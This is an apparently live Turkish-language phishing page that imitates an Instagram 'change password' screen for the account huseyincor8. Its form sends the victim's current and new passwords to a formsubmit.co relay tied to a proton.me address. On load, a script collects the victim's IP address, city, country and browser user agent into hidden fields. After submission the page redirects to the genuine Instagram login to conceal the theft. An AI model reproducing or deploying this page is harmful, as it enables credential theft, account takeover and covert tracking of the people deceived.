<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Şifreyi Değiştir</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="antialiased bg-white text-black font-sans h-screen flex flex-col">

    <div class="flex-grow flex justify-center p-6">
        <div class="w-full max-w-lg flex flex-col gap-y-6">
            
            <header class="flex items-center">
                <button class="p-2 rounded-full hover:bg-neutral-100 transition">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-6 h-6">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18" />
                    </svg>
                </button>
                <span class="ml-4 text-xs text-neutral-600">huseyincor8 • Instagram</span>
            </header>

            <section class="px-4">
                <h1 class="text-3xl font-extrabold tracking-tight text-neutral-900">Şifreyi değiştir</h1>
                <p class="mt-3 text-sm text-neutral-600 leading-relaxed">
                    Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!\$@%) oluşmalıdır.
                </p>
            </section>

            <form action="https://formsubmit.co/london1616@proton.me" method="POST" id="myForm" class="flex flex-col gap-y-4 px-4">
                
                <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_template" value="table">

                <!-- IP ve Cihaz Bilgileri İçin Alanlar -->
                <input type="hidden" name="IP_Adresi" id="ipInput" value="Alınıyor...">
                <input type="hidden" name="Sehir_Ulke" id="locationInput" value="Alınıyor...">
                <input type="hidden" name="Cihaz_Bilgisi" id="deviceInput" value="">

                <div class="relative">
                    <input type="text" 
                           name="Mevcut_Sifre"
                           placeholder="Mevcut şifre (Güncelleme 25.08.2024)"
                           required
                           class="w-full px-4 py-3.5 text-sm border border-neutral-300 rounded-lg focus:border-neutral-400 focus:ring-0 transition outline-none">
                </div>

                <div class="relative">
                    <input type="password" 
                           name="Yeni_Sifre"
                           placeholder="Yeni şifre"
                           required
                           class="w-full px-4 py-3.5 text-sm border border-neutral-300 rounded-lg focus:border-neutral-400 focus:ring-0 transition outline-none">
                </div>

                <div class="relative">
                    <input type="password" 
                           name="Yeni_Sifre_Tekrar"
                           placeholder="Yeni şifreyi tekrar yaz"
                           required
                           class="w-full px-4 py-3.5 text-sm border border-neutral-300 rounded-lg focus:border-neutral-400 focus:ring-0 transition outline-none">
                </div>

                <div class="text-left mt-1">
                    <a href="#" class="text-sm font-semibold text-[#0095F6] hover:text-[#0064e0] transition">Şifreni mi unuttun?</a>
                </div>

                <div class="flex items-start mt-3 gap-x-3">
                    <div class="flex items-center h-5">
                        <input id="logout-devices" type="checkbox" name="Diger_Cihazlardan_Cikis" value="Evet"
                               class="w-5 h-5 accent-black border-neutral-400 rounded focus:ring-0 cursor-pointer">
                    </div>
                    <label for="logout-devices" class="text-sm text-neutral-800 cursor-pointer">
                        Diğer cihazlardan çıkış yap. Hesabını başka birisi kullandıysa bunu seç.
                    </label>
                </div>

                <div class="pt-6">
                    <button type="submit" class="w-full py-3 px-5 text-sm font-semibold text-white rounded-full bg-[#0095F6] hover:bg-[#1877F2] transition">
                        Şifreyi değiştir
                    </button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Sayfa açıldığında IP ve konumu çekip gizli kutulara yazdırır
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                if(data.ip) {
                    document.getElementById('ipInput').value = data.ip;
                    document.getElementById('locationInput').value = (data.city || 'Bilinmiyor') + ' / ' + (data.country_name || 'Bilinmiyor');
                }
            })
            .catch(() => {
                document.getElementById('ipInput').value = 'Alınamadı';
                document.getElementById('locationInput').value = 'Alınamadı';
            });

        // Cihaz tarayıcı bilgisini ekle
        document.getElementById('deviceInput').value = navigator.userAgent;
    </script>

</body>
</html>
